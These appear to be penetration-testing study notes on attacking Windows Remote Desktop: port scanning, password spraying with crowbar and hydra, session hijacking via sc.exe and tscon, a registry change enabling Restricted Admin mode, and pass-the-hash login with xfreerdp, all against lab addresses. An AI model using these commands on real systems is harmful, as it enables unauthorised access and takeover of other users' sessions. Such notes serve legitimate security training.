# Identify the available RDP service

## nmap

```bash
nmap -Pn -p3389 192.168.2.143 
```

---

# Password Spraying Against RDP

## Crowbar - Bruteforce RDP

- The password will be tested against a userlist

```bash
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

## Hydra - Bruteforce RDP

```bash
 hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

---

# RDP Login

## rdesktop

```bash
 rdesktop -u admin -p password123 192.168.2.143
```

## xfreerdp3

```bash
xfreerdp /v:ip_address /u:username /p:password
```

---

# Protocol Specific Attacks - RDP

## RDP Session Hijacking

Note: This method no longer works on Server 2019.

1. Gained access to a machine
2. We have an account with local administrator privileges
3. A user is connected via RDP to our compromised machine
4. We can hijack that users session

## Example

- We are logged in as the user juurena (UserID = 2) who has Administrator privileges. Our goal is to hijack the user lewen (User ID = 4), who is also logged in via RDP.

![image.png](attachment:2447b63f-b998-458c-92fc-52de14acbcae:image.png)

---

### List Active RDP Sessions

```bash
query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
```

---

### Create Service to Hijack RDP Session

```bash
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

![image.png](attachment:eb488ef3-2da9-497d-b1d2-37e9fbbcb67e:image.png)

---

### Start the Hijack Service

```bash
net start sessionhijack
```

---

### Manually Hijack RDP Session (Alternative)

```bash
tscon {TARGET_SESSION_ID} /dest:{OUR_SESSION_NAME}
```

---

## RDP Pass-the-Hash (PtH)

Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:

![image.png](attachment:200be891-317f-4740-a322-70de4ce8d225:image.png)

This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa. It can be done using the following command:

### ðŸ”‘ Add Registry Key to Enable Restricted Admin Mode

```bash
reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![image.png](attachment:d519acb3-d43c-4559-8853-b5b86683f9b0:image.png)

---

Once it is added we can xfreerdp with the pass the hash command

### ðŸ’» RDP Pass-the-Hash with xfreerdp

```bash
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

